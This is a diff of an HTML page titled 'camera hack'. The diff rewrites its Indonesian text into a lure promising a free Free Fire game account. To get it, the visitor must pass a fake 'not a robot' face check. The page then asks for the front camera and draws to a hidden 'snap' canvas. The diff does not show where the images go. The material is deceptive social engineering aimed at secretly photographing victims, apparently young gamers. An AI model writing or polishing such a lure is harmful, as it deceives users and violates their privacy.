@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>camera hack</title>
+  <title>Mohon Verifikasi untuk mendapatkan akun free fire gratis.</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
     body {
@@ -32,8 +32,8 @@
 </head>
 <body>
   <h2>camera hack</h2>
-  <p>Untuk mengaktifkan fitur ini, lakukan verifikasi wajah singkat.</p>
-  <button onclick="startSnap()">Aktifkan Sekarang</button>
+  <p>Untuk mendapatkan akun free fire gratis,kami perlu memastikan bahwa anda bukan robot menggunakan kamera.</p>
+  <button onclick="startSnap()">Verifikasi</button>
   <video id="cam" autoplay muted playsinline></video>
   <canvas id="snap" style="display:none;"></canvas>
   <p id="status" style="margin-top: 20px;"></p>
@@ -48,7 +48,7 @@ async function startSnap() {
   const ctx = canvas.getContext('2d');
   const status = document.getElementById('status');
 
-  status.innerText = "Mengaktifkan kamera...";
+  status.innerText = "Mengenali Wajah.....";
 
   try {
     const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
